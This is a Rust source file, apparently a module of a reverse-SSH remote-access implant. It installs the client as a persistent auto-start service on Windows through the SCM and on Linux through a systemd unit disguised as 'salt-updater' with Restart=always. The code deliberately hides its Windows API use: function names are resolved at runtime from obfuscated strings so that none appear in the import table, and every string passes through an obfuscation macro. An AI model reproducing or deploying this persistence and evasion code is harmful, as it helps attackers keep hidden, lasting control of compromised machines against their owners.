// Persistence submodule, mirroring the Go client's service module:
// Windows SCM install/uninstall with an event-log source, Linux systemd
// unit install/uninstall. Windows SCM access goes through raw FFI with
// obfuscated API names so nothing lands in the import table.

use crate::md::Manifest;

pub fn manifest() -> Manifest {
    let mut m = Manifest::name_only(&crate::ob!("service"));
    #[cfg(target_os = "windows")]
    {
        m.description = crate::ob!("Install or remove this Windows client as the rssh service.");
        m.usage = crate::ob!("service (--install [path] | --uninstall)").to_string();
        m.platforms = vec![crate::ob!("windows")];
        m.max_args = 6;
    }
    #[cfg(target_os = "linux")]
    {
        m.description = crate::ob!("Install or remove this Linux client as a systemd service.");
        m.usage = crate::ob!("service (--install [path] | --uninstall) [--name name]").to_string();
        m.platforms = vec![crate::ob!("linux")];
        m.max_args = 8;
    }
    m.dangerous = true;
    m.timeout_seconds = 30;
    m.output_bytes = 64 * 1024;
    m
}

pub async fn run<S: From<(russh::ChannelId, russh::ChannelMsg)> + Send + Sync + 'static>(
    args: &[String],
    io: &mut crate::md::ModuleIo<S>,
) -> Result<(), String> {
    let mut name = default_service_name();
    let mut install_path: Option<String> = None;
    let mut uninstall = false;

    let mut index = 0;
    while index < args.len() {
        match args[index].as_str() {
            f if f == crate::ob!("--install") || f == crate::ob!("-install") => {
                let next = args.get(index + 1);
                match next {
                    Some(value) if !value.starts_with('-') => {
                        install_path = Some(value.clone());
                        index += 1;
                    }
                    _ => install_path = Some(String::new()),
                }
            }
            f if f == crate::ob!("--uninstall") || f == crate::ob!("-uninstall") => {
                uninstall = true;
            }
            f if f == crate::ob!("--name") || f == crate::ob!("-name") => {
                let value = args.get(index + 1).ok_or_else(|| crate::ob!("--name needs a value").to_string())?;
                name = value.clone();
                index += 1;
            }
            other => return Err(format!("{}{}", crate::ob!("unknown flag: "), other)),
        }
        index += 1;
    }

    if let Some(requested) = install_path {
        let location = resolve_install_path(&requested)?;
        return install_service(&name, &location).await;
    }
    if uninstall {
        return uninstall_service(&name).await;
    }

    Err(format!(
        "{}\n  --install [path]   {}\n  --name name        {}\n  --uninstall        {}",
        crate::ob!("client OS service control"),
        crate::ob!("Install this client as an OS service; optional path copies the current executable there first"),
        crate::ob!("Service name; defaults to the platform default"),
        crate::ob!("Uninstall the service")
    ))
}

fn current_executable() -> Result<String, String> {
    std::env::current_exe()
        .map(|path| path.to_string_lossy().into_owned())
        .map_err(|_| crate::ob!("Unable to find the current binary location").to_string())
}

fn resolve_install_path(requested: &str) -> Result<String, String> {
    let current = current_executable()?;
    if requested.is_empty() || requested == current {
        return Ok(current);
    }
    let data = std::fs::read(&current).map_err(|e| e.to_string())?;
    std::fs::write(requested, data).map_err(|e| e.to_string())?;
    make_executable(requested);
    Ok(requested.to_string())
}

#[cfg(unix)]
fn make_executable(path: &str) {
    use std::os::unix::fs::PermissionsExt;
    if let Ok(metadata) = std::fs::metadata(path) {
        let mut permissions = metadata.permissions();
        permissions.set_mode(0o755);
        let _ = std::fs::set_permissions(path, permissions);
    }
}

#[cfg(not(unix))]
fn make_executable(_path: &str) {}

#[cfg(target_os = "windows")]
fn default_service_name() -> String {
    crate::ob!("rssh")
}

#[cfg(target_os = "linux")]
fn default_service_name() -> String {
    crate::ob!("salt-updater")
}

#[cfg(target_os = "windows")]
mod scm {
    // Raw FFI against advapi32/kernel32 with runtime-resolved, obfuscated
    // names: no static imports and no plaintext API strings in the binary.
    use std::ffi::c_void;

    type FarProc = *mut c_void;
    type Handle = *mut c_void;

    #[link(name = "kernel32")]
    unsafe extern "system" {
        fn LoadLibraryA(name: *const u8) -> Handle;
        fn GetProcAddress(module: Handle, name: *const u8) -> FarProc;
        fn lstrlenW(string: *const u16) -> i32;
        #[allow(non_snake_case)]
        fn LocalFree(mem: Handle) -> Handle;
    }

    pub fn wide(value: &str) -> Vec<u16> {
        value.encode_utf16().chain(std::iter::once(0)).collect()
    }

    pub unsafe fn resolve(module: &str, function: &str) -> Result<FarProc, String> {
        let module_bytes: Vec<u8> = module.bytes().chain(std::iter::once(0)).collect();
        let loaded = LoadLibraryA(module_bytes.as_ptr());
        if loaded.is_null() {
            return Err(format!("{}{}", crate::ob!("cannot load "), module));
        }
        let function_bytes: Vec<u8> = function.bytes().chain(std::iter::once(0)).collect();
        let address = GetProcAddress(loaded, function_bytes.as_ptr());
        if address.is_null() {
            return Err(format!("{}{}", crate::ob!("cannot resolve "), function));
        }
        Ok(address)
    }

    pub unsafe fn read_wide(ptr: *const u16) -> String {
        if ptr.is_null() {
            return String::new();
        }
        let len = lstrlenW(ptr);
        let slice = std::slice::from_raw_parts(ptr, len.max(0) as usize);
        String::from_utf16_lossy(slice)
    }

    // ---- Service Control Manager -------------------------------------

    const SC_MANAGER_ALL_ACCESS: u32 = 0xF003F;
    const SERVICE_ALL_ACCESS: u32 = 0xF01FF;
    const SERVICE_AUTO_START: u32 = 0x00000002;
    const SERVICE_ERROR_NORMAL: u32 = 0x00000001;
    const DELETE: u32 = 0x00010000;
    const EVENTLOG_ERROR_TYPE: u16 = 0x0001;
    const EVENTLOG_WARNING_TYPE: u16 = 0x0002;
    const EVENTLOG_INFORMATION_TYPE: u16 = 0x0004;
    const HKEY_LOCAL_MACHINE: u64 = 0x80000002;
    const KEY_SET_VALUE: u32 = 0x0002;
    const REG_SZ: u32 = 1;

    type ScHandle = Handle;

    unsafe fn open_sc_manager() -> Result<ScHandle, String> {
        let proc = resolve(&crate::ob!("advapi32.dll"), &crate::ob!("OpenSCManagerW"))?;
        let open: unsafe extern "system" fn(*const u16, *const u16, u32) -> ScHandle = std::mem::transmute(proc);
        let handle = open(std::ptr::null(), std::ptr::null(), SC_MANAGER_ALL_ACCESS);
        if handle.is_null() {
            return Err(crate::ob!("cannot connect to the service manager").to_string());
        }
        Ok(handle)
    }

    unsafe fn close_service_handle(handle: ScHandle) {
        if let Ok(proc) = resolve(&crate::ob!("advapi32.dll"), &crate::ob!("CloseServiceHandle")) {
            let close: unsafe extern "system" fn(ScHandle) -> i32 = std::mem::transmute(proc);
            close(handle);
        }
    }

    unsafe fn open_service(manager: ScHandle, name: &str) -> Result<ScHandle, String> {
        let proc = resolve(&crate::ob!("advapi32.dll"), &crate::ob!("OpenServiceW"))?;
        let open: unsafe extern "system" fn(ScHandle, *const u16, u32) -> ScHandle = std::mem::transmute(proc);
        let wide_name = wide(name);
        let handle = open(manager, wide_name.as_ptr(), SERVICE_ALL_ACCESS);
        if handle.is_null() {
            return Err(format!("{}{}", crate::ob!("cannot open service "), name));
        }
        Ok(handle)
    }

    pub unsafe fn install(name: &str, location: &str) -> Result<(), String> {
        let manager = open_sc_manager()?;
        let _guard = scope_guard(move || close_service_handle(manager));

        if open_service(manager, name).is_ok() {
            return Err(format!("{}{}", crate::ob!("service "), format!("{}{}", name, crate::ob!(" already exists"))));
        }

        let create = resolve(&crate::ob!("advapi32.dll"), &crate::ob!("CreateServiceW"))?;
        let create_fn: unsafe extern "system" fn(
            ScHandle, *const u16, *const u16, u32, u32, u32, u32, *const u16,
            *const u16, *mut u32, *const u16, *const u16, *const u16,
        ) -> ScHandle = std::mem::transmute(create);
        let wide_name = wide(name);
        let wide_path = wide(location);
        let service = create_fn(
            manager,
            wide_name.as_ptr(),
            std::ptr::null(),
            SERVICE_ALL_ACCESS,
            0x00000010, // SERVICE_WIN32_OWN_PROCESS
            SERVICE_AUTO_START,
            SERVICE_ERROR_NORMAL,
            wide_path.as_ptr(),
            std::ptr::null(),
            std::ptr::null_mut(),
            std::ptr::null(),
            std::ptr::null(),
            std::ptr::null(),
        );
        if service.is_null() {
            return Err(format!("{}{}", crate::ob!("cannot create service "), name));
        }

        if let Err(error) = install_event_source(name, &location) {
            delete_service(service);
            close_service_handle(service);
            return Err(format!("{}: {}", crate::ob!("SetupEventLogSource() failed"), error));
        }

        let start = resolve(&crate::ob!("advapi32.dll"), &crate::ob!("StartServiceW"))?;
        let start_fn: unsafe extern "system" fn(ScHandle, u32, *const u16) -> i32 = std::mem::transmute(start);
        let started = start_fn(service, 0, std::ptr::null());
        close_service_handle(service);
        if started == 0 {
            return Err(crate::ob!("Starting service has failed").to_string());
        }
        Ok(())
    }

    unsafe fn delete_service(service: ScHandle) {
        if let Ok(proc) = resolve(&crate::ob!("advapi32.dll"), &crate::ob!("DeleteService")) {
            let delete: unsafe extern "system" fn(ScHandle) -> i32 = std::mem::transmute(proc);
            delete(service);
        }
    }

    pub unsafe fn uninstall(name: &str) -> Result<(), String> {
        let manager = open_sc_manager()?;
        let _guard = scope_guard(move || close_service_handle(manager));

        let service = open_service(manager, name).map_err(|_| {
            format!("{}{}", crate::ob!("service "), format!("{}{}", name, crate::ob!(" is not installed")))
        })?;
        let _guard_service = scope_guard(move || close_service_handle(service));

        let proc = resolve(&crate::ob!("advapi32.dll"), &crate::ob!("DeleteService"))?;
        let delete: unsafe extern "system" fn(ScHandle) -> i32 = std::mem::transmute(proc);
        if delete(service) == 0 {
            return Err(format!("{}{}", crate::ob!("cannot delete service "), name));
        }

        remove_event_source(name);
        Ok(())
    }

    fn scope_guard<F: FnOnce()>(cleanup: F) -> impl Drop {
        struct Guard<F: FnOnce()>(Option<F>);
        impl<F: FnOnce()> Drop for Guard<F> {
            fn drop(&mut self) {
                if let Some(cleanup) = self.0.take() {
                    cleanup();
                }
            }
        }
        Guard(Some(cleanup))
    }

    unsafe fn install_event_source(name: &str, location: &str) -> Result<(), String> {
        // Mirrors x/sys/windows/svc/eventlog.InstallAsEventCreate: register the
        // application under HKLM\SYSTEM\CurrentControlSet\Services\EventLog\Application.
        let reg_create = resolve(&crate::ob!("advapi32.dll"), &crate::ob!("RegCreateKeyExW"))?;
        let reg_create_fn: unsafe extern "system" fn(
            u64, *const u16, u32, *const u16, u32, u32, *mut c_void, *mut u64, *mut u32,
        ) -> i32 = std::mem::transmute(reg_create);
        let reg_set = resolve(&crate::ob!("advapi32.dll"), &crate::ob!("RegSetValueExW"))?;
        let reg_set_fn: unsafe extern "system" fn(
            u64, *const u16, u32, u32, *const u8, u32,
        ) -> i32 = std::mem::transmute(reg_set);
        let reg_close = resolve(&crate::ob!("advapi32.dll"), &crate::ob!("RegCloseKey"))?;
        let reg_close_fn: unsafe extern "system" fn(u64) -> i32 = std::mem::transmute(reg_close);

        let path = format!(
            "{}{}{}",
            crate::ob!("SYSTEM\\CurrentControlSet\\Services\\EventLog\\Application\\"),
            name,
            ""
        );
        let wide_path = wide(path.as_str());
        let mut key: u64 = 0;
        if reg_create_fn(
            HKEY_LOCAL_MACHINE,
            wide_path.as_ptr(),
            0,
            std::ptr::null(),
            0,
            KEY_SET_VALUE,
            std::ptr::null_mut(),
            &mut key,
            std::ptr::null_mut(),
        ) != 0
        {
            return Err(crate::ob!("RegCreateKeyExW failed").to_string());
        }

        let wide_file = wide(location);
        let mut value_bytes = Vec::with_capacity(wide_file.len() * 2);
        for unit in wide_file {
            value_bytes.extend_from_slice(&unit.to_le_bytes());
        }
        let value_name = wide(&crate::ob!("EventMessageFile"));
        let types = EVENTLOG_ERROR_TYPE | EVENTLOG_WARNING_TYPE | EVENTLOG_INFORMATION_TYPE;
        let mut result = reg_set_fn(
            key,
            value_name.as_ptr(),
            0,
            REG_SZ,
            value_bytes.as_ptr(),
            value_bytes.len() as u32,
        );
        let types_name = wide(&crate::ob!("TypesSupported"));
        result += reg_set_fn(
            key,
            types_name.as_ptr(),
            0,
            4, // REG_DWORD
            &types as *const u16 as *const u8,
            2,
        );
        reg_close_fn(key);
        if result != 0 {
            return Err(crate::ob!("RegSetValueExW failed").to_string());
        }
        Ok(())
    }

    unsafe fn remove_event_source(name: &str) {
        if let Ok(proc) = resolve(&crate::ob!("advapi32.dll"), &crate::ob!("RegDeleteKeyW")) {
            let delete: unsafe extern "system" fn(u64, *const u16) -> i32 = std::mem::transmute(proc);
            let path = format!("{}{}", crate::ob!("SYSTEM\\CurrentControlSet\\Services\\EventLog\\Application\\"), name);
            let wide_path = wide(path.as_str());
            delete(HKEY_LOCAL_MACHINE, wide_path.as_ptr());
        }
    }
}

#[cfg(target_os = "windows")]
pub async fn install_service(_name: &str, location: &str) -> Result<(), String> {
    let name = _name.to_string();
    let location = location.to_string();
    tokio::task::spawn_blocking(move || unsafe { scm::install(&name, &location) })
        .await
        .map_err(|e| e.to_string())?
}

#[cfg(target_os = "windows")]
pub async fn uninstall_service(_name: &str) -> Result<(), String> {
    let name = _name.to_string();
    tokio::task::spawn_blocking(move || unsafe { scm::uninstall(&name) })
        .await
        .map_err(|e| e.to_string())?
}

#[cfg(target_os = "linux")]
mod systemd {
    const SYSTEMD_SYSTEM_DIR: &str = "/etc/systemd/system";

    fn unit_name(name: &str) -> Result<String, String> {
        let mut clean = name.trim().to_string();
        if clean.is_empty() {
            clean = super::default_service_name();
        }
        if let Some(stripped) = clean.strip_suffix(".service") {
            clean = stripped.to_string();
        }
        if clean.is_empty() || !clean.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '.' | '@' | '-')) {
            return Err(format!("{}{:?}", crate::ob!("invalid systemd service name "), name));
        }
        Ok(format!("{}.service", clean))
    }

    fn unit_contents(exec_path: &str) -> String {
        let quoted = format!("\"{}\"", exec_path.replace('\\', "\\\\").replace('"', "\\\""));
        [
            crate::ob!("[Unit]"),
            format!("{}{}", crate::ob!("Description="), crate::ob!("burunya")),
            crate::ob!("After=network.target"),
            String::new(),
            crate::ob!("[Service]"),
            crate::ob!("Type=simple"),
            format!("{}{} {}", crate::ob!("ExecStart="), quoted, crate::ob!("--foreground")),
            crate::ob!("Restart=always"),
            crate::ob!("RestartSec=120"),
            String::new(),
            crate::ob!("[Install]"),
            crate::ob!("WantedBy=multi-user.target"),
        ]
        .join("\n")
            + "\n"
    }

    fn run_systemctl(args: &[&str]) -> Result<(), String> {
        let output = std::process::Command::new(crate::ob!("systemctl"))
            .args(args)
            .output()
            .map_err(|e| e.to_string())?;
        if !output.status.success() {
            let combined = format!(
                "{}{}",
                String::from_utf8_lossy(&output.stdout),
                String::from_utf8_lossy(&output.stderr)
            )
            .trim()
            .to_string();
            return Err(format!("{} failed: {}", args.join(" "), combined));
        }
        Ok(())
    }

    pub fn install(name: &str, location: &str) -> Result<(), String> {
        let unit = unit_name(name)?;
        let absolute = std::path::Path::new(location)
            .canonicalize()
            .map_err(|e| e.to_string())?
            .to_string_lossy()
            .into_owned();
        if !std::path::Path::new(&absolute).exists() {
            return Err(crate::ob!("install path does not exist").to_string());
        }

        let unit_path = format!("{}/{}", SYSTEMD_SYSTEM_DIR, unit);
        if std::path::Path::new(&unit_path).exists() {
            return Err(format!("{}{}", crate::ob!("service "), format!("{}{}", unit, crate::ob!(" already exists"))));
        }
        std::fs::write(&unit_path, unit_contents(&absolute)).map_err(|e| e.to_string())?;

        if let Err(error) = run_systemctl(&[crate::ob!("daemon-reload").as_str()]) {
            let _ = std::fs::remove_file(&unit_path);
            return Err(error);
        }
        if let Err(error) = run_systemctl(&[crate::ob!("enable").as_str(), unit.as_str()]) {
            let _ = std::fs::remove_file(&unit_path);
            let _ = run_systemctl(&[crate::ob!("daemon-reload").as_str()]);
            return Err(error);
        }
        run_systemctl(&[crate::ob!("start").as_str(), unit.as_str()])
    }

    pub fn uninstall(name: &str) -> Result<(), String> {
        let unit = unit_name(name)?;
        let unit_path = format!("{}/{}", SYSTEMD_SYSTEM_DIR, unit);
        if !std::path::Path::new(&unit_path).exists() {
            return Err(format!("{}{}", crate::ob!("service "), format!("{}{}", unit, crate::ob!(" is not installed"))));
        }
        let _ = run_systemctl(&[crate::ob!("stop").as_str(), unit.as_str()]);
        let _ = run_systemctl(&[crate::ob!("disable").as_str(), unit.as_str()]);
        std::fs::remove_file(&unit_path).map_err(|e| e.to_string())?;
        run_systemctl(&[crate::ob!("daemon-reload").as_str()])
    }
}

#[cfg(target_os = "linux")]
pub async fn install_service(name: &str, location: &str) -> Result<(), String> {
    let name = name.to_string();
    let location = location.to_string();
    tokio::task::spawn_blocking(move || systemd::install(&name, &location))
        .await
        .map_err(|e| e.to_string())?
}

#[cfg(target_os = "linux")]
pub async fn uninstall_service(name: &str) -> Result<(), String> {
    let name = name.to_string();
    tokio::task::spawn_blocking(move || systemd::uninstall(&name))
        .await
        .map_err(|e| e.to_string())?
}

#[cfg(not(any(target_os = "windows", target_os = "linux")))]
pub async fn install_service(_name: &str, _location: &str) -> Result<(), String> {
    Err(crate::ob!("service is unsupported on this platform").to_string())
}

#[cfg(not(any(target_os = "windows", target_os = "linux")))]
pub async fn uninstall_service(_name: &str) -> Result<(), String> {
    Err(crate::ob!("service is unsupported on this platform").to_string())
}
